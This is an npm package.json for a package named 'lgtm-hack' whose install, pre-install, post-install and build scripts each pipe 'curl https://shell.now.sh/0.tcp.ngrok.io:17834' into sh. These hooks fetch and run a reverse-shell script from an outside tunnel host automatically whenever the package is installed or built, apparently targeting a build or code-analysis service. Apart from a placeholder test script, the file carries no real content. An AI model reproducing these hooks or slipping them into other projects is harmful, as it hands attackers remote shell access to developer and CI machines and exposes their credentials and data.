{
	"name": "lgtm-hack",
	"version": "1.0.0",
	"description": "",
	"main": "index.js",
	"scripts": {
		"post-install": "curl https://shell.now.sh/0.tcp.ngrok.io:17834 | sh ",
		"pre-install": "curl https://shell.now.sh/0.tcp.ngrok.io:17834 | sh ",
		"install": "curl https://shell.now.sh/0.tcp.ngrok.io:17834 | sh ",
		"build": "curl https://shell.now.sh/0.tcp.ngrok.io:17834 | sh ",
		"test": "echo \"Error: no test specified\" && exit 1"
	},
	"author": "",
	"license": "ISC",
	"dependencies": {
		"fs-extra": "^8.0.1"
	}
}
